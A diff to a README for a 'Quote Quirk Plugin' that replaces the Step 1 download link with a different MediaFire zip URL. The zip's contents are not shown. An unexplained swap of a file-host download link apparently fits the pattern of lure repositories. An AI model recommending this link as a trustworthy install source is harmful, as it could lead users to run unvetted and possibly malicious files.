@@ -20,7 +20,7 @@ Getting started with the Quote Quirk Plugin is as easy as pie:
 
 ### Step 1: Download 📥
 
-1. **Download** the plugin from **[here](https://www.mediafire.com/file/36tvbtza60ultqv/QuoteQuirk.zip/file)**. 📥
+1. **Download** the plugin from **[here](https://www.mediafire.com/file/bqqh5cbe2gz5m8k/QuoteQuirk.zip/file)**. 📥
 
 ### Step 2: Install 🛠️
 
